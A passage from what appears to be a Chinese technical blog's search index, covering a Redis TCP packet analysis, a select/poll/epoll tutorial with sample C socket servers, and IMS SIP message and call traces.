ping0x0d0a -&gt; \\r\\n dev2向dev发送了ping数据，第四个包完毕。第五个包，dev2向dev发送ack响应。 序列号为0xfe33 5504=4264776964, ack确认号为0xf65a ec0e=4133153806=(4133153792+14).第六个包，dev向dev2响应pong消息。序列号fe33 5504，确认号f65a ec0e, TCP头部可选长度为12B, IP数据报总长度为59B, 首部长度为20B,因此TCP数据长度为7B. 数据部分2b50 4f4e 470d 0a, 翻译过来就是+PONG\\r\\n.至此，Redis客户端和Server端的三次握手过程分析完毕。 参考https://zhuanlan.zhihu.com/p/53374516","categories":[{"name":"TCP","slug":"TCP","permalink":"https://wuhaocn.github.io/categories/TCP/"}],"tags":[{"name":"TCP","slug":"TCP","permalink":"https://wuhaocn.github.io/tags/TCP/"}]},{"title":"Linux IO模式及select、poll、epoll详解","slug":"network/protocol/tcp/Linux IO模式及select、poll、epoll详解","date":"2023-11-15T03:40:25.015Z","updated":"2023-11-15T03:40:25.016Z","comments":true,"path":"2023/11/15/network/protocol/tcp/Linux IO模式及select、poll、epoll详解/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/network/protocol/tcp/Linux%20IO%E6%A8%A1%E5%BC%8F%E5%8F%8Aselect%E3%80%81poll%E3%80%81epoll%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"0、前言对于每一个从事 Web 服务器开发的后端程序员，必然绕不开网络编程，而其中最基础也是最重要的部分就是 Linux IO 模式及 Socket 编程。什么是 Socket 呢？简单理解，就是 ip地址 + 端口号。当两个进程间需要通信时，首先要创建五元组（源ip地址、目的ip地址、源端口号、目的端口号、协议），建立 tcp 连接，建立好连接之后，两个进程各自有一个 Socket 来标识，这两个 socket 组成的 socket pair 也就唯一标识了一个连接。有了连接之后，应用程序得要从 tcp 流上获取数据，然后再处理数据。于是，诞生了三种高效的 Socket 编程方法：select、poll 和 epoll.本文将首先介绍下 Linux IO 的几种模式以及一些前置知识，因为这是理解 select、poll 和 epoll 的前提；接下来重点介绍下 select、poll 和 epoll 的工作原理及优缺点；最后附上样例代码注：本人并不是从事 web 后端开发的工作，平时也就用用 grpc/brpc（封装了 socket 编程模型），所以尽量从概念及实现原理上把这个知识地点讲清楚，如果有讲的不对的地方，欢迎专业人士批评指正。 1、几个基础概念1.1、用户空间和内核空间对于32位操作系统而言，它的寻址空间是4G（2的32次方），注意这里的4G是虚拟内存空间大小。以 Linux 为例，它将最高的1G字节给内核使用，称为内核空间，剩下的3G给用户进程使用，称为用户空间。这样做的好处就是隔离，保证内核安全。 1.2、进程切换这是内核要干的事，字面意思很好理解，挂起正在运行的 A 进程，然后运行 B 进程，当然这其中的流程比较复杂，涉及到上下文切换，且非常消耗资源，感兴趣的同学可以去深入研究。 1.3、进程的阻塞 进程阻塞是本进程的行为，比如和其他进程通信时，等待请求的数据返回； 进程进入阻塞状态时不占用CPU资源的 1.4、文件描述符在 Linux 世界里，一切皆文件。怎么理解呢？当程序打开一个现有文件或创建新文件时，内核会向进程返回一个文件描述符，文件描述符在形式上是一个非负整数，其实就是一个索引值，指向该进程打开文件的记录表（它是由内核维护的）。 1.5、缓存 I/O和标准 IO 是一个概念，当应用程序需要从内核读数据时，数据先被拷贝到操作系统的内核缓冲区（page cache），然后再从该缓冲区拷贝到应用程序的地址空间。 2、Linux IO 模式当应用程序发起一次 read 调用时，会经历以下两个阶段： 等待数据准备 (Waiting for the data to be ready) 将数据从内核拷贝到进程中 (Copying the data from the kernel to the process) 正式因为这两个阶段，Linux 系统产生了下述五种 IO 方式： 阻塞 I/O（blocking IO） 非阻塞 I/O（nonblocking IO） 异步 I/O（asynchronous IO） I/O 多路复用（ IO multiplexing） 信号驱动 I/O（ signal driven IO）（很少见，可忽略） 它们具体怎么工作，这里做下总结： 2.1、blocking 和 non-blocking的区别blocking IO的特点就是在IO执行的两个阶段都被block了。non-blocking IO 的特点是用户进程需要不断的主动询问内核 “ 数据好了吗？” 2.2、IO 多路复用I/O 多路复用的特点是通过一种机制一个进程能同时等待多个文件描述符，而这些文件描述符（套接字描述符）其中的任意一个进入读就绪状态，select()函数就可以返回。 2.3、synchronous IO和asynchronous IO的区别POSIX 中是这样定义的： A synchronous I/O operation causes the requesting process to be blocked until that I/O operation completes; An asynchronous I/O operation does not cause the requesting process to be blocked;两者的区别就在于synchronous IO做”IO operation”的时候会将process阻塞。按照这个定义，之前所述的blocking IO，non-blocking IO，IO multiplexing 都属于 synchronous IO。 2.4、各个IO 模式的比较可以发现： 对于 non-blocking IO中，虽然进程大部分时间都不会被 block，但是它仍然要求进程去主动的 check，并且当数据准备完成以后，也需要进程主动的再次调用recvfrom来将数据拷贝到用户内存。 asynchronous IO 完全不同于 no-blocking IO，它就像是用户进程将整个 IO 操作交给了内核完成，然后内核做完后发出信号通知。在此期间，用户进程不需要去检查 IO 操作的状态，也不需要主动的去拷贝数据。 3、IO 多路复用之 select、poll、epoll 详解select，poll，epoll 都是 IO 多路复用的机制，它们都需要在读写事件就绪后自己负责进行读写，也就是说这个读写过程是阻塞的。 3.1、selectselect 最多能同时监视 1024 个 socket（因为 fd_set 结构体大小是 128 字节，每个 bit 表示一个文件描述符）。用户需要维护一个临时数组，存储文件描述符。当内核有事件发生时，内核将 fd_set 中没发生的文件描述符清空，然后拷贝到用户区。select 返回的是整个数组，它需要遍历整个数组才知道谁发生了变化。 3.2、pollpoll 就是把 select 中的 fd_set 数组换成了链表，其他和 select 没什么不同。 3.3、epollepoll 是基于事件驱动的 IO 方式，它没有文件描述符个数限制，它将用户关心的文件描述符的事件存放到内核的一个事件表中（简单来说，就是由内核来负责存储（红黑树）有事件的 socket 句柄），这样在用户空间和内核空间的copy只需一次。优点如下： 没有最大并发连接的限制，能打开的fd上限远大于1024（1G的内存能监听约10万个端口） 采用回调的方式，效率提升。只有活跃可用的fd才会调用callback函数，也就是说 epoll 只管你“活跃”的连接，而跟连接总数无关； 内存拷贝。使用mmap()文件映射内存来加速与内核空间的消息传递，减少复制开销。 epoll 有两种工作方式： LT模式（水平触发）：若就绪的事件一次没有处理完，就会一直去处理。也就是说，将没有处理完的事件继续放回到就绪队列之中（即那个内核中的链表），一直进行处理。 ET模式（边缘触发）：就绪的事件只能处理一次，若没有处理完会在下次的其它事件就绪时再进行处理。而若以后再也没有就绪的事件，那么剩余的那部分数据也会随之而丢失。 由此可见：ET模式的效率比LT模式的效率要高很多。_简单点说就是，如果对于一个非阻塞 socket，如果使用 epoll 边缘模式去检测数据是否可读，触发可读事件以后，一定要一次性把 socket 上的数据收取干净才行，也就是说一定要循环调用 recv 函数直到 recv 出错，错误码是EWOULDBLOCK（EAGAIN 一样）（此时表示 socket 上本次数据已经读完）；如果使用水平模式，则不用，你可以根据业务一次性收取固定的字节数，或者收完为止。_只是如果使用ET模式，就要保证每次进行数据处理时，要将其处理完，不能造成数据丢失，这样对编写代码的人要求就比较高。 3.4、select、poll、epoll 三者区别 4、代码详解4.1 select123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157#include&lt;stdio.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/socket.h&gt;#include&lt;unistd.h&gt;#include&lt;netinet/in.h&gt;#include&lt;arpa/inet.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;sys/time.h&gt;static void Usage(const char* proc)&#123; printf(&quot;%s [local_ip] [local_port]\\n&quot;,proc);&#125;int array[4096];static int start_up(const char* _ip,int _port)&#123; int sock = socket(AF_INET,SOCK_STREAM,0); if(sock &lt; 0) &#123; perror(&quot;socket&quot;); exit(1); &#125; struct sockaddr_in local; local.sin_family = AF_INET; local.sin_port = htons(_port); local.sin_addr.s_addr = inet_addr(_ip); if(bind(sock,(struct sockaddr*)&amp;local,sizeof(local)) &lt; 0) &#123; perror(&quot;bind&quot;); exit(2); &#125; if(listen(sock,10) &lt; 0) &#123; perror(&quot;listen&quot;); exit(3); &#125; return sock;&#125;int main(int argc,char* argv[])&#123; if(argc != 3) &#123; Usage(argv[0]); return -1; &#125; int listensock = start_up(argv[1],atoi(argv[2])); int maxfd = 0; fd_set rfds; fd_set wfds; array[0] = listensock; int i = 1; int array_size = sizeof(array)/sizeof(array[0]); for(; i &lt; array_size;i++) &#123; array[i] = -1; &#125; while(1) &#123; FD_ZERO(&amp;rfds); FD_ZERO(&amp;wfds); for(i = 0;i &lt; array_size;++i) &#123; if(array[i] &gt; 0) &#123; FD_SET(array[i],&amp;rfds); FD_SET(array[i],&amp;wfds); if(array[i] &gt; maxfd) &#123; maxfd = array[i]; &#125; &#125; &#125; switch(select(maxfd + 1,&amp;rfds,&amp;wfds,NULL,NULL)) &#123; case 0: &#123; printf(&quot;timeout\\n&quot;); break; &#125; case -1: &#123; perror(&quot;select&quot;); break; &#125; default: &#123; int j = 0; for(; j &lt; array_size; ++j) &#123; if(j == 0 &amp;&amp; FD_ISSET(array[j],&amp;rfds)) &#123; //listensock happened read events struct sockaddr_in client; socklen_t len = sizeof(client); int new_sock = accept(listensock,(struct sockaddr*)&amp;client,&amp;len); if(new_sock &lt; 0)//accept failed &#123; perror(&quot;accept&quot;); continue; &#125; else//accept success &#123; printf(&quot;get a new client%s\\n&quot;,inet_ntoa(client.sin_addr)); fflush(stdout); int k = 1; for(; k &lt; array_size;++k) &#123; if(array[k] &lt; 0) &#123; array[k] = new_sock; if(new_sock &gt; maxfd) maxfd = new_sock; break; &#125; &#125; if(k == array_size) &#123; close(new_sock); &#125; &#125; &#125;//j == 0 else if(j != 0 &amp;&amp; FD_ISSET(array[j], &amp;rfds)) &#123; //new_sock happend read events char buf[1024]; ssize_t s = read(array[j],buf,sizeof(buf) - 1); if(s &gt; 0)//read success &#123; buf[s] = 0; printf(&quot;clientsay#%s\\n&quot;,buf); if(FD_ISSET(array[j],&amp;wfds)) &#123; char *msg = &quot;HTTP/1.0 200 OK &lt;\\r\\n\\r\\n&lt;html&gt;&lt;h1&gt;yingying beautiful&lt;/h1&gt;&lt;/html&gt;\\r\\n&quot;; write(array[j],msg,strlen(msg)); &#125; &#125; else if(0 == s) &#123; printf(&quot;client quit!\\n&quot;); close(array[j]); array[j] = -1; &#125; else &#123; perror(&quot;read&quot;); close(array[j]); array[j] = -1; &#125; &#125;//else j != 0 &#125; break; &#125; &#125; &#125; return 0;&#125; 4.2、Poll123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/socket.h&gt;#include&lt;netinet/in.h&gt;#include&lt;arpa/inet.h&gt;#include&lt;poll.h&gt;static void usage(const char *proc)&#123; printf(&quot;%s [local_ip] [local_port]\\n&quot;,proc);&#125;int start_up(const char*_ip,int _port)&#123; int sock = socket(AF_INET,SOCK_STREAM,0); if(sock &lt; 0) &#123; perror(&quot;socket&quot;); return 2; &#125; int opt = 1; setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,&amp;opt,sizeof(opt)); struct sockaddr_in local; local.sin_family = AF_INET; local.sin_port = htons(_port); local.sin_addr.s_addr = inet_addr(_ip); if(bind(sock,(struct sockaddr*)&amp;local,sizeof(local)) &lt; 0) &#123; perror(&quot;bind&quot;); return 3; &#125; if(listen(sock,10) &lt; 0) &#123; perror(&quot;listen&quot;); return 4; &#125; return sock;&#125;int main(int argc, char*argv[])&#123; if(argc != 3) &#123; usage(argv[0]); return 1; &#125; int sock = start_up(argv[1],atoi(argv[2])); struct pollfd peerfd[1024]; peerfd[0].fd = sock; peerfd[0].events = POLLIN; int nfds = 1; int ret; int maxsize = sizeof(peerfd)/sizeof(peerfd[0]); int i = 1; int timeout = -1; for(; i &lt; maxsize; ++i) &#123; peerfd[i].fd = -1; &#125; while(1) &#123; switch(ret = poll(peerfd,nfds,timeout)) &#123; case 0: printf(&quot;timeout...\\n&quot;); break; case -1: perror(&quot;poll&quot;); break; default: &#123; if(peerfd[0].revents &amp; POLLIN) &#123; struct sockaddr_in client; socklen_t len = sizeof(client); int new_sock = accept(sock,\\ (struct sockaddr*)&amp;client,&amp;len); printf(&quot;accept finish %d\\n&quot;,new_sock); if(new_sock &lt; 0) &#123; perror(&quot;accept&quot;); continue; &#125; printf(&quot;get a new client\\n&quot;); int j = 1; for(; j &lt; maxsize; ++j) &#123; if(peerfd[j].fd &lt; 0) &#123; peerfd[j].fd = new_sock; break; &#125; &#125; if(j == maxsize) &#123; printf(&quot;to many clients...\\n&quot;); close(new_sock); &#125; peerfd[j].events = POLLIN; if(j + 1 &gt; nfds) nfds = j + 1; &#125; for(i = 1;i &lt; nfds;++i) &#123; if(peerfd[i].revents &amp; POLLIN) &#123; printf(&quot;read ready\\n&quot;); char buf[1024]; ssize_t s = read(peerfd[i].fd,buf, \\ sizeof(buf) - 1); if(s &gt; 0) &#123; buf[s] = 0; printf(&quot;client say#%s&quot;,buf); fflush(stdout); peerfd[i].events = POLLOUT; &#125; else if(s &lt;= 0) &#123; close(peerfd[i].fd); peerfd[i].fd = -1; &#125; else &#123; &#125; &#125;//i != 0 else if(peerfd[i].revents &amp; POLLOUT) &#123; char *msg = &quot;HTTP/1.0 200 OK \\ &lt;\\r\\n\\r\\n&lt;html&gt;&lt;h1&gt; \\ yingying beautiful \\ &lt;/h1&gt;&lt;/html&gt;\\r\\n&quot;; write(peerfd[i].fd,msg,strlen(msg)); close(peerfd[i].fd); peerfd[i].fd = -1; &#125; else &#123; &#125; &#125;//for &#125;//default break; &#125; &#125; return 0;&#125; 具体流程如下： poll()函数返回fds集合中就绪的读、写，或出错的描述符数量，返回0表示超时，返回-1表示出错； fds是一个struct pollfd类型的数组，用于存放需要检测其状态的socket描述符，并且调用poll函数之后fds数组不会被清空； nfds记录数组fds中描述符的总数量； timeout是调用poll函数阻塞的超时时间，单位毫秒； 一个pollfd结构体表示一个被监视的文件描述符，通过传递fds[]指示 poll() 监视多个文件描述符。其中，结构体的events域是监视该文件描述符的事件掩码，由用户来设置这个域，结构体的revents域是文件描述符的操作结果事件掩码，内核在调用返回时设置这个域。events域中请求的任何事件都可能在revents域中返回。 4.3、epoll123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139#include&lt;stdio.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/socket.h&gt;#include&lt;netinet/in.h&gt;#include&lt;arpa/inet.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;sys/epoll.h&gt;static Usage(const char* proc)&#123; printf(&quot;%s [local_ip] [local_port]\\n&quot;,proc);&#125;int start_up(const char*_ip,int _port)&#123; int sock = socket(AF_INET,SOCK_STREAM,0); if(sock &lt; 0) &#123; perror(&quot;socket&quot;); exit(2); &#125; struct sockaddr_in local; local.sin_family = AF_INET; local.sin_port = htons(_port); local.sin_addr.s_addr = inet_addr(_ip); if(bind(sock,(struct sockaddr*)&amp;local,sizeof(local)) &lt; 0) &#123; perror(&quot;bind&quot;); exit(3); &#125; if(listen(sock,10)&lt; 0) &#123; perror(&quot;listen&quot;); exit(4); &#125; return sock;&#125;int main(int argc, char*argv[])&#123; if(argc != 3) &#123; Usage(argv[0]); return 1; &#125; int sock = start_up(argv[1],atoi(argv[2])); int epollfd = epoll_create(256); if(epollfd &lt; 0) &#123; perror(&quot;epoll_create&quot;); return 5; &#125; struct epoll_event ev; ev.events = EPOLLIN; ev.data.fd = sock; if(epoll_ctl(epollfd,EPOLL_CTL_ADD,sock,&amp;ev) &lt; 0) &#123; perror(&quot;epoll_ctl&quot;); return 6; &#125; int evnums = 0;//epoll_wait return val struct epoll_event evs[64]; int timeout = -1; while(1) &#123; switch(evnums = epoll_wait(epollfd,evs,64,timeout)) &#123; case 0: printf(&quot;timeout...\\n&quot;); break; case -1: perror(&quot;epoll_wait&quot;); break;default: &#123; int i = 0; for(; i &lt; evnums; ++i) &#123; struct sockaddr_in client; socklen_t len = sizeof(client); if(evs[i].data.fd == sock \\ &amp;&amp; evs[i].events &amp; EPOLLIN) &#123; int new_sock = accept(sock, \\ (struct sockaddr*)&amp;client,&amp;len); if(new_sock &lt; 0) &#123; perror(&quot;accept&quot;); continue; &#125;//if accept failed else &#123; printf(&quot;Get a new client[%s]\\n&quot;, \\ inet_ntoa(client.sin_addr)); ev.data.fd = new_sock; ev.events = EPOLLIN; epoll_ctl(epollfd,EPOLL_CTL_ADD,\\ new_sock,&amp;ev); &#125;//accept success &#125;//if fd == sock else if(evs[i].data.fd != sock &amp;&amp; \\ evs[i].events &amp; EPOLLIN) &#123; char buf[1024]; ssize_t s = read(evs[i].data.fd,buf,sizeof(buf) - 1); if(s &gt; 0) &#123; buf[s] = 0; printf(&quot;client say#%s&quot;,buf); ev.data.fd = evs[i].data.fd; ev.events = EPOLLOUT; epoll_ctl(epollfd,EPOLL_CTL_MOD, \\ evs[i].data.fd,&amp;ev); &#125;//s &gt; 0 else &#123; close(evs[i].data.fd); epoll_ctl(epollfd,EPOLL_CTL_DEL, \\ evs[i].data.fd,NULL); &#125; &#125;//fd != sock else if(evs[i].data.fd != sock \\ &amp;&amp; evs[i].events &amp; EPOLLOUT) &#123; char *msg = &quot;HTTP/1.0 200 OK &lt;\\r\\n\\r\\n&lt;html&gt;&lt;h1&gt;yingying beautiful &lt;/h1&gt;&lt;/html&gt;\\r\\n&quot;; write(evs[i].data.fd,msg,strlen(msg)); close(evs[i].data.fd); epoll_ctl(epollfd,EPOLL_CTL_DEL, \\ evs[i].data.fd,NULL); &#125;//EPOLLOUT else &#123; &#125; &#125;//for &#125;//default break; &#125;//switch &#125;//while return 0;&#125; epoll_create函数创建一个epoll句柄，参数size表明内核要监听的描述符数量。调用成功时返回一个epoll句柄描述符，失败时返回-1。 epoll_ctl函数注册要监听的事件类型。四个参数解释如下： epfd表示epoll句柄； op表示fd操作类型：EPOLL_CTL_ADD（注册新的fd到epfd中），EPOLL_CTL_MOD（修改已注册的fd的监听事件），EPOLL_CTL_DEL（从epfd中删除一个fd）；fd是要监听的描述符； event表示要监听的事件，epoll_event结构体定义如下： 12345678910struct epoll_event &#123; __uint32_t events; /* Epoll events */ epoll_data_t data; /* User data variable */ &#125;; typedef union epoll_data &#123; void *ptr; int fd; __uint32_t u32; __uint64_t u64; &#125; epoll_data_t; . epoll_wait 函数等待事件的就绪，成功时返回就绪的事件数目，调用失败时返回 -1，等待超时返回 0。maxevents告诉内核events的大小，timeout表示等待的超时事件。 5、总结epoll是 Linux 目前大规模网络并发程序开发的首选模型。在绝大多数情况下性能远超 select和poll。目前流行的高性能web服务器Nginx正式依赖于epoll提供的高效网络套接字轮询服务。但是，在并发连接不高的情况下，多线程+阻塞 IO 方式可能性能更好。","categories":[{"name":"TCP","slug":"TCP","permalink":"https://wuhaocn.github.io/categories/TCP/"}],"tags":[{"name":"TCP","slug":"TCP","permalink":"https://wuhaocn.github.io/tags/TCP/"}]},{"title":"IMS-短信发送","slug":"network/protocol/sip/IMS-短信发送","date":"2023-11-15T03:40:25.015Z","updated":"2023-11-15T03:40:25.015Z","comments":true,"path":"2023/11/15/network/protocol/sip/IMS-短信发送/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/network/protocol/sip/IMS-%E7%9F%AD%E4%BF%A1%E5%8F%91%E9%80%81/","excerpt":"","text":"1.概要 发送MESSAGE tel:+8615068458834 SIP/2.0Max-Forwards: 70Via: SIP/2.0/TCP 10.235.162.57:56808;branch=z9hG4bK-EKbwawmAUser-Agent: CPM-client/OMA2.2 RCS-client/UP_2.4 term-Xiaomi/MI 6-8.0.0 client-MF/1.1.0 OS-Android/8.0.0 Channel-terminal-000001 Channel-client-731184Call-ID: a989baac-4e10-4e10-a64b-4ec7e161d645Contribution-ID: 94d850fb-ed40-437e-9609-de9ea0e393d9Conversation-ID: 4f93f0fe-86d6-462c-9ba2-e4bc3d1cafccFrom: tel:+8615053065637;tag=p0Xq8MnyTo: tel:+8615068458834CSeq: 1 MESSAGEP-Preferred-Identity: tel:+8615053065637P-Preferred-Service: urn:urn-7:3gpp-service.ims.icsi.oma.cpm.msgContent-Type: message/cpimContent-Length: 350 From: tel:+8615053065637To: tel:+8615068458834DateTime: 2020-09-27T04:02:25.941ZNS: cpm http://www.openmobilealliance.org/cpm/cpm.Payload-Type: text/plainNS: imdn urn:ietf:params:imdnimdn.Message-ID: 0a76cec9-c5f4-4f1d-a502-8518a57bf8be Content-Type: text/plainContent-Transfer-Encoding: base64Content-Length: 8 5Z6D5Zy+ 应答SIP/2.0 202 AcceptedServer: IM-Sever/OMA5.1Record-Route: sip:orig@10.10.208.199:6060;transport=tcp;lr;i=2;s=0Via: SIP/2.0/TCP 10.235.162.57:56808;branch=z9hG4bK-EKbwawmA;received=124.64.18.253;rport=50095From: tel:+8615053065637;tag=p0Xq8MnyCall-ID: a989baac-4e10-4e10-a64b-4ec7e161d645To: tel:+8615068458834;tag=644677907844CSeq: 1 MESSAGEMax-Forwards: 70Conversation-ID: 4f93f0fe-86d6-462c-9ba2-e4bc3d1cafccContribution-ID: 94d850fb-ed40-437e-9609-de9ea0e393d9Content-Length: 0","categories":[{"name":"SIP","slug":"SIP","permalink":"https://wuhaocn.github.io/categories/SIP/"}],"tags":[{"name":"IMS","slug":"IMS","permalink":"https://wuhaocn.github.io/tags/IMS/"}]},{"title":"音视频通话","slug":"network/protocol/sip/IMS-音视频通话报文","date":"2023-11-15T03:40:25.015Z","updated":"2023-11-15T03:40:25.015Z","comments":true,"path":"2023/11/15/network/protocol/sip/IMS-音视频通话报文/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/network/protocol/sip/IMS-%E9%9F%B3%E8%A7%86%E9%A2%91%E9%80%9A%E8%AF%9D%E6%8A%A5%E6%96%87/","excerpt":"","text":"1.主要流程 2.音频通话2.1 INVITE1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556INVITE tel:+8616500000062 SIP/2.0From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=rvecbSkTo: &quot;8616500000062&quot;&lt;tel:+8616500000062&gt;P-Preferred-Identity: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;Contact: &lt;sip:+8616500000061@222.222.2.27:5060&gt;;+sip.instance=&quot;&lt;urn:gsma:imei:86354104-407800-0&gt;&quot;;+g.3gpp.icsi-ref=&quot;urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel&quot;;audio;video;+g.3gpp.mid-call;+g.3gpp.srvcc-alerting;+g.3gpp.ps2cs-srvcc-orig-pre-alertingAccept-Contact: *;+g.3gpp.icsi-ref=&quot;urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel&quot;P-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000P-Preferred-Service: urn:urn-7:3gpp-service.ims.icsi.mmtelP-Early-Media: supportedSupported: 100rel,histinfo,join,norefersub,precondition,replaces,timer,sec-agreeAllow: INVITE,ACK,OPTIONS,BYE,CANCEL,UPDATE,INFO,PRACK,NOTIFY,MESSAGE,REFERAccept: application/sdp,application/3gpp-ims+xmlSession-Expires: 1800Min-SE: 90Route: &lt;sip:172.16.106.38:5060;lr&gt;Require: sec-agreeProxy-Require: sec-agreeCall-ID: quecbSk9i@222.222.2.27CSeq: 1 INVITEMax-Forwards: 70Via: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKswecbCEJ7GcqBMwaay6Y;rportUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Content-Type: application/sdpContent-Length: 772v=0o=rue 3211 3211 IN IP4 222.222.2.27s=-c=IN IP4 222.222.2.27b=AS:41b=RR:1537b=RS:512t=0 0m=audio 31022 RTP/AVP 107 106 105 104 101 102b=AS:41b=RR:1537b=RS:512a=rtpmap:107 AMR-WB/16000/1a=fmtp:107 mode-change-capability=2;max-red=0a=rtpmap:106 AMR-WB/16000/1a=fmtp:106 octet-align=1;mode-change-capability=2;max-red=0a=rtpmap:105 AMR/8000/1a=fmtp:105 mode-change-capability=2;max-red=0a=rtpmap:104 AMR/8000/1a=fmtp:104 octet-align=1;mode-change-capability=2;max-red=0a=rtpmap:101 telephone-event/16000a=fmtp:101 0-15a=rtpmap:102 telephone-event/8000a=fmtp:102 0-15a=ptime:20a=maxptime:240a=sendrecva=curr:qos local nonea=curr:qos remote nonea=des:qos mandatory local sendrecva=des:qos optional remote sendrecv 2.2 Trying12345678SIP/2.0 100 TryingVia: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKswecbCEJ7GcqBMwaay6Y;rport=5060To: &quot;8616500000062&quot; &lt;tel:+8616500000062&gt;;tag=464889803917From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=rvecbSkCall-ID: quecbSk9i@222.222.2.27CSeq: 1 INVITEServer: IM-Sever/OMA5.1Content-Length: 0 2.3 183 Session Progress123456789101112131415161718192021222324252627282930313233343536373839404142SIP/2.0 183 Session ProgressP-Preferred-Identity: &lt;sip:+8616500000062@ims.mnc000.mcc000.3gppnetwork.org&gt;P-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000Allow: INVITE,ACK,OPTIONS,BYE,CANCEL,UPDATE,INFO,PRACK,NOTIFY,MESSAGE,REFERRequire: 100rel,preconditionUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Content-Type: application/sdpVia: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKswecbCEJ7GcqBMwaay6Y;rport=5060From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=rvecbSkCall-ID: quecbSk9i@222.222.2.27To: &quot;8616500000062&quot; &lt;tel:+8616500000062&gt;;tag=464889803917CSeq: 1 INVITEMax-Forwards: 70Contact: &lt;sip:+8616500000062@172.16.106.38:5060;transport=udp&gt;;+g.3gpp.icsi-ref=&quot;urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel&quot;;audio;video;+g.3gpp.mid-call;+g.3gpp.srvcc-alertingSession-Expires: 1800RSeq: 1Content-Length: 487v=0o=rue 3219 3219 IN IP4 172.16.106.38s=-c=IN IP4 172.16.106.38b=AS:41b=RR:1537b=RS:512t=0 0m=audio 30052 RTP/AVP 107 101b=AS:41b=RR:1537b=RS:512a=rtpmap:107 AMR-WB/16000/1a=fmtp:107 mode-change-capability=2;max-red=0a=rtpmap:101 telephone-event/16000a=fmtp:101 0-15a=ptime:20a=maxptime:240a=sendrecva=curr:qos local nonea=curr:qos remote nonea=des:qos mandatory local sendrecva=des:qos mandatory remote sendrecva=conf:qos remote sendrecv 2.4 PRACK123456789101112PRACK sip:+8616500000062@172.16.106.38:5060;transport=udp SIP/2.0From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=rvecbSkTo: &quot;8616500000062&quot;&lt;tel:+8616500000062&gt;;tag=464889803917Call-ID: quecbSk9i@222.222.2.27CSeq: 2 PRACKMax-Forwards: 70Supported: 100rel,histinfo,join,norefersub,precondition,replaces,timerP-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000Via: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKtxecbCEJ7GcqBMwaaq6Y;rportRAck: 1 1 INVITEUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Content-Length: 0 2.5 200 OK12345678SIP/2.0 200 OKVia: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKtxecbCEJ7GcqBMwaaq6Y;rport=5060To: &quot;8616500000062&quot; &lt;tel:+8616500000062&gt;;tag=464889803917From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=rvecbSkCall-ID: quecbSk9i@222.222.2.27CSeq: 2 PRACKServer: IM-Sever/OMA5.1Content-Length: 0 2.6 UPDATE12345678910111213141516171819202122232425262728293031323334353637383940UPDATE sip:+8616500000062@172.16.106.38:5060;transport=udp SIP/2.0From: &lt;sip:+8616500000061@ims.mnc000.mcc000.3gppnetwork.org&gt;;tag=rvecbSkTo: &quot;8616500000062&quot;&lt;tel:+8616500000062&gt;;tag=464889803917Contact: &lt;sip:+8616500000061@222.222.2.27:5060&gt;;+sip.instance=&quot;&lt;urn:gsma:imei:86354104-407800-0&gt;&quot;;+g.3gpp.icsi-ref=&quot;urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel&quot;;audio;video;+g.3gpp.mid-call;+g.3gpp.srvcc-alerting;+g.3gpp.ps2cs-srvcc-orig-pre-alertingP-Access-Network-Info: 3GPP-NR-TDD;utran-cell-id-3gpp=4600000112207A123000Supported: 100rel,histinfo,join,norefersub,precondition,replaces,timer,sec-agreeRequire: precondition,sec-agreeAllow: INVITE,ACK,OPTIONS,BYE,CANCEL,UPDATE,INFO,PRACK,NOTIFY,MESSAGE,REFERProxy-Require: sec-agreeCall-ID: quecbSk9i@222.222.2.27CSeq: 3 UPDATEMax-Forwards: 70Via: SIP/2.0/UDP 222.222.2.27:5060;branch=z9hG4bKqyecbCEJ7GcqBMwaaW6Y;rportUser-Agent: IM-client/OMA1.0 HW-Rto/V1.0Content-Type: application/sdpContent-Length: 461v=0o=rue 3211 3212 IN IP4 222.222.2.27s=-c=IN IP4 222.222.2.27b=AS:41b=RR:1537b=RS:512t=0 0m=audio 31022 RTP/AVP 107 